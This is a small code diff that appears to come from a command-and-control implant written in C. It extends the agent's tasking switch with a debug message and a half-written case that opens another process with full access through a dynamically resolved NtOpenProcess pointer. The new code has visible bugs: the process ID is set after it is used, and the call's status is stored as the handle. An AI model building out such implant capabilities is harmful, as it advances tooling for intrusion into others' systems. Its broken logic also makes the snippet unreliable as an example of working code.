@@ -44,11 +44,26 @@ void TaskingRoutine() {
 
 		    switch (AgentCMD.CommandID) {
                 case NO_JOB:
+                    printf("[info] no job to do.\n");
                     break;
 
                 case REGISTER_AGENT:
                     PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL);
                     break;
+
+		        case LIST_LOADED_MODULES:
+					NTSTATUS NtStatus = 0x00;
+		    		PROCESS_BASIC_INFORMATION PBI = {0};
+		    		UINT32 ProcID = 0;
+		    		HANDLE hProc = NULL;
+		    		CLIENT_ID ClientID = {0};
+		    		ClientID.UniqueProcess = ProcID;
+
+		    		ProcID = ParserReadInt32(&Parser);
+					hProc = agent->apis->pNtOpenProcess(&hProc, PROCESS_ALL_ACCESS, FALSE, &ClientID);
+
+
+					break;
 
                 default:
                     break;
